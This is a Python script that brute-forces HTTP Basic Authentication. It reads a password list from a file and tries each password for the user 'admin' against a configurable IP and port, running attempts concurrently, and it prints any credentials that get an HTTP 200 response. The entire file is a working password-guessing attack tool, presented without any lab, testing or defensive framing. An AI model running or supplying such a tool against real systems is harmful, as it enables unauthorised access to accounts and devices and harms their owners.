import aiohttp
import asyncio
from tqdm import tqdm
from itertools import islice

import time

login_successful = False  # Global flag to indicate if login was successful

total_attempts = 0

async def login_with_basic_auth(session, url, username, password):
    global login_successful  # Reference the global flag
    try:
        # Set up the authentication credentials
        credentials = aiohttp.BasicAuth(username, password)

        # Send the request with basic authentication
        async with session.get(url, auth=credentials) as response:
            # Check if the login was successful (HTTP status code 200)
            if response.status == 200:
                print(f"Login successful! Username: {username}, Password: {password}")
                login_successful = True  # Set the global flag to True
            else:
                pass

    except aiohttp.ClientError as e:
        print(f"An error occurred: {e}")

async def run_test_async(url, username, password):
    async with aiohttp.ClientSession() as session:
        await login_with_basic_auth(session, url, username, password)

IPaddress = "192.168.0.1"
port = "9001"
login_url = f"http://{IPaddress}:{port}"  # Replace this with the actual login URL
username = "admin"  # Replace with your actual username

async def read_credentials_from_file(filename, chunk_size=1000):
    arguments_list = []
    total_lines = sum(1 for line in open(filename, 'r', encoding='latin-1'))
    total_chunks = (total_lines + chunk_size - 1) // chunk_size  # Calculate total chunks
    with tqdm(total=total_lines, desc=f"Loading Credentials ({total_chunks} chunks)", unit="line") as pbar:
        with open(filename, 'r', encoding='latin-1') as file:
            while True:
                chunk = [line.strip() for line in islice(file, chunk_size)]
                if not chunk:
                    break
                arguments_list.extend(chunk)
                pbar.update(len(chunk))
    return arguments_list

async def main():
    filename = "credentials.txt"
    chunk_size = 10000  # Set the chunk size according to your requirement
    arguments_list = await read_credentials_from_file(filename, chunk_size)

    max_workers = 7
    semaphore = asyncio.Semaphore(max_workers)

    async def run_with_semaphore(username, password, pbar):
        if not login_successful:  # Check if login was successful before proceeding
            async with semaphore:
                await run_test_async(login_url, username, password)
                pbar.update(1)
    tasks = []

    # Loop through the credentials in chunks
    for i in range(0, len(arguments_list), chunk_size):
        if login_successful:  # Check if login was successful before proceeding
            break  # If successful, stop processing further credentials
        chunk = arguments_list[i:i + chunk_size]

        current_chunk_number = (i // chunk_size) + 1
        total_chunks = (len(arguments_list) + chunk_size - 1) // chunk_size
        with tqdm(total=len(chunk), desc=f"Chunk {current_chunk_number} of {total_chunks}", unit=" attempt") as pbar:
            for password in chunk:
                if login_successful:  # Check if login was successful before proceeding
                    break  # If successful, stop processing further credentials
                task = asyncio.create_task(run_with_semaphore(username, password, pbar))
                tasks.append(task)

            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
